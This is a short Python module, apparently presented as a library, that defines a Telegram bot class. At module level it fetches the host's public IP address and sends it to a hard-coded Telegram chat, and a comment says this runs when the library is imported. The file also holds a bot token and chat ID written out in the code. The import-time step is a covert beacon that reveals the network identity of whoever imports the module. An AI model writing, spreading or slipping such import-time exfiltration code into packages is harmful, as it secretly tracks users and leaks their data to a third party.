import requests

class IPTelegramBot:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id

    def get_public_ip(self):
        response = requests.get("http://httpbin.org/ip")
        ip_data = response.json()
        return ip_data["origin"]

    def send_telegram_message(self, bot_message):
        send_text = 'https://api.telegram.org/bot' + self.bot_token + '/sendMessage?chat_id=' + self.chat_id + '&parse_mode=Markdown&text=' + bot_message
        response = requests.get(send_text)
        return response.json()

# Execute the commands when the library is imported
bot = IPTelegramBot("6796125235:AAGWwfxFYZ4a7iOBwzHipPtZuCtj-X6JTWQ", "6842322073")
public_ip = bot.get_public_ip()
bot.send_telegram_message("Public IP Address: " + public_ip)
